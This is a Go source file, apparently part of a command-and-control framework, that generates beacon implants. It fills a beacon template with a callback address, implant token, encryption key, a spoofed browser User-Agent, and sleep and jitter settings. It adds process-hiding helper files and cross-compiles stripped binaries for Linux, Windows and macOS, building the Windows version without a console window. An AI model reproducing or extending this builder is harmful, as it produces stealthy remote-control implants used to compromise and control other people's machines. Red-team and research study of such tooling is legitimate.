package c2

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"

	"github.com/google/uuid"
	"go.uber.org/zap"
)

// PayloadBuilderInput 构建 beacon 的输入参数
type PayloadBuilderInput struct {
	ListenerID    string // l_xxx
	OS            string // linux|windows|darwin
	Arch          string // amd64|arm64|386
	SleepSeconds  int
	JitterPercent int
	OutputName    string // custom output filename (without extension); defaults to "beacon_<os>_<arch>"
	// Host 非空时作为植入端回连地址（覆盖监听器的 bind_host / 0.0.0.0 自动探测）
	Host string
}

// PayloadBuilder 负责从模板生成并交叉编译 beacon 二进制
type PayloadBuilder struct {
	manager   *Manager
	logger    *zap.Logger
	tmplDir   string // 模板目录，如 internal/c2/payload_templates
	outputDir string // 输出目录，如 tmp/c2/payloads
}

// NewPayloadBuilder 创建构建器
func NewPayloadBuilder(manager *Manager, logger *zap.Logger, tmplDir, outputDir string) *PayloadBuilder {
	if tmplDir == "" {
		tmplDir = "internal/c2/payload_templates"
	}
	if outputDir == "" {
		outputDir = "tmp/c2/payloads"
	}
	return &PayloadBuilder{
		manager:   manager,
		logger:    logger,
		tmplDir:   tmplDir,
		outputDir: outputDir,
	}
}

// BuildResult 构建结果
type BuildResult struct {
	PayloadID    string `json:"payload_id"`
	ListenerID   string `json:"listener_id"`
	OutputPath   string `json:"output_path"`
	DownloadPath string `json:"download_path"` // 磁盘上的绝对路径
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	SizeBytes    int64  `json:"size_bytes"`
}

// BuildBeacon 交叉编译生成 beacon 二进制
func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, error) {
	listener, err := b.manager.DB().GetC2Listener(in.ListenerID)
	if err != nil {
		return nil, fmt.Errorf("get listener: %w", err)
	}
	if listener == nil {
		return nil, ErrListenerNotFound
	}

	lt := strings.ToLower(listener.Type)

	cfg := &ListenerConfig{}
	if listener.ConfigJSON != "" {
		_ = parseJSON(listener.ConfigJSON, cfg)
	}
	cfg.ApplyDefaults()

	// 确定目标架构
	goos := strings.ToLower(in.OS)
	goarch := strings.ToLower(in.Arch)
	if goos == "" {
		goos = "linux"
	}
	if goarch == "" {
		goarch = "amd64"
	}

	// 读取模板
	tmplPath := filepath.Join(b.tmplDir, "beacon.go.tmpl")
	tmplData, err := os.ReadFile(tmplPath)
	if err != nil {
		return nil, fmt.Errorf("read template: %w", err)
	}

	// 模板参数：请求 Host > 监听器 callback_host > bind 推导（见 ResolveBeaconDialHost）
	host := ResolveBeaconDialHost(listener, in.Host, b.logger, listener.ID)
	serverURL := fmt.Sprintf("%s://%s:%d",
		listenerTypeToScheme(listener.Type),
		host,
		listener.BindPort,
	)

	transport := "http"
	tcpDialAddr := ""
	transportMeta := "http_beacon"
	switch lt {
	case "tcp_reverse":
		transport = "tcp"
		tcpDialAddr = net.JoinHostPort(host, strconv.Itoa(listener.BindPort))
		transportMeta = "tcp_beacon"
	case "https_beacon":
		transportMeta = "https_beacon"
	case "websocket":
		transportMeta = "websocket"
	}

	data := map[string]string{
		"Transport":         transport,
		"TCPDialAddr":       tcpDialAddr,
		"TransportMetadata": transportMeta,
		"ServerURL":         serverURL,
		"ImplantToken":      listener.ImplantToken,
		"AESKeyB64":         listener.EncryptionKey,
		"SleepSeconds":      fmt.Sprintf("%d", firstPositive(in.SleepSeconds, cfg.DefaultSleep, 5)),
		"JitterPercent":     fmt.Sprintf("%d", clamp(in.JitterPercent, 0, 100)),
		"CheckInPath":       cfg.BeaconCheckInPath,
		"TasksPath":         cfg.BeaconTasksPath,
		"ResultPath":        cfg.BeaconResultPath,
		"UploadPath":        cfg.BeaconUploadPath,
		"FilePath":          cfg.BeaconFilePath,
		"UserAgent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	// 执行模板
	tmpl, err := template.New("beacon").Parse(string(tmplData))
	if err != nil {
		return nil, fmt.Errorf("parse template: %w", err)
	}

	// 创建工作目录
	workDir := filepath.Join(b.outputDir, "build-"+uuid.New().String()[:8])
	if err := os.MkdirAll(workDir, 0755); err != nil {
		return nil, fmt.Errorf("mkdir: %w", err)
	}
	defer os.RemoveAll(workDir) // 清理

	srcPath := filepath.Join(workDir, "main.go")
	f, err := os.Create(srcPath)
	if err != nil {
		return nil, fmt.Errorf("create source: %w", err)
	}
	if err := tmpl.Execute(f, data); err != nil {
		f.Close()
		return nil, fmt.Errorf("execute template: %w", err)
	}
	f.Close()

	// 平台相关辅助源文件（如无窗口子进程）
	for _, name := range []string{"proc_hide_windows.go", "proc_hide_unix.go"} {
		helperSrc := filepath.Join(b.tmplDir, name+".tmpl")
		helperData, readErr := os.ReadFile(helperSrc)
		if readErr != nil {
			return nil, fmt.Errorf("read helper %s: %w", name, readErr)
		}
		if writeErr := os.WriteFile(filepath.Join(workDir, name), helperData, 0644); writeErr != nil {
			return nil, fmt.Errorf("write helper %s: %w", name, writeErr)
		}
	}

	// 交叉编译
	payloadID := "p_" + strings.ReplaceAll(uuid.New().String(), "-", "")[:14]
	binName := strings.TrimSpace(in.OutputName)
	if binName == "" {
		binName = fmt.Sprintf("beacon_%s_%s_%s", goos, goarch, payloadID)
	}
	if goos == "windows" && !strings.HasSuffix(binName, ".exe") {
		binName += ".exe"
	}
	binPath := filepath.Join(b.outputDir, binName)

	if err := os.MkdirAll(b.outputDir, 0755); err != nil {
		return nil, fmt.Errorf("mkdir output: %w", err)
	}

	absBinPath, err := filepath.Abs(binPath)
	if err != nil {
		return nil, fmt.Errorf("abs output path: %w", err)
	}
	ldflags := "-s -w -buildid="
	if goos == "windows" {
		// 无控制台窗口运行 beacon 本体
		ldflags += " -H windowsgui"
	}
	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-trimpath", "-o", absBinPath, ".")
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
	)
	cmd.Dir = workDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		b.logger.Error("beacon build failed", zap.String("output", string(output)), zap.Error(err))
		return nil, fmt.Errorf("build failed: %w (output: %s)", err, string(output))
	}

	// 获取文件大小
	info, err := os.Stat(binPath)
	if err != nil {
		return nil, fmt.Errorf("stat output: %w", err)
	}

	return &BuildResult{
		PayloadID:    payloadID,
		ListenerID:   listener.ID,
		OutputPath:   absBinPath,
		DownloadPath: absBinPath,
		OS:           goos,
		Arch:         goarch,
		SizeBytes:    info.Size(),
	}, nil
}

func listenerTypeToScheme(t string) string {
	switch strings.ToLower(t) {
	case "https_beacon":
		return "https"
	case "websocket":
		return "ws"
	case "http_beacon":
		return "http"
	default:
		return "http"
	}
}

func firstPositive(vals ...int) int {
	for _, v := range vals {
		if v > 0 {
			return v
		}
	}
	return 1
}

func clamp(v, min, max int) int {
	if v < min {
		return min
	}
	if v > max {
		return max
	}
	return v
}

// GetPayloadStoragePath 返回 payload 存储目录的绝对路径
func (b *PayloadBuilder) GetPayloadStoragePath() string {
	abs, _ := filepath.Abs(b.outputDir)
	return abs
}

// GetSupportedOSArch 返回支持的操作系统和架构列表
func GetSupportedOSArch() map[string][]string {
	return map[string][]string{
		"linux":   {"amd64", "arm64", "386", "arm"},
		"windows": {"amd64", "arm64", "386"},
		"darwin":  {"amd64", "arm64"},
	}
}

// ValidateOSArch 验证 OS/Arch 组合是否可编译
func ValidateOSArch(os, arch string) bool {
	supported := GetSupportedOSArch()
	arches, ok := supported[strings.ToLower(os)]
	if !ok {
		return false
	}
	for _, a := range arches {
		if a == strings.ToLower(arch) {
			return true
		}
	}
	return false
}

// detectExternalIP returns the first non-loopback IPv4 address, or "" if none found.
func detectExternalIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipnet, ok := addr.(*net.IPNet)
			if !ok || ipnet.IP.To4() == nil {
				continue
			}
			return ipnet.IP.String()
		}
	}
	return ""
}

func parseJSON(s string, v interface{}) error {
	if strings.TrimSpace(s) == "" || s == "{}" {
		return nil
	}
	return json.Unmarshal([]byte(s), v)
}
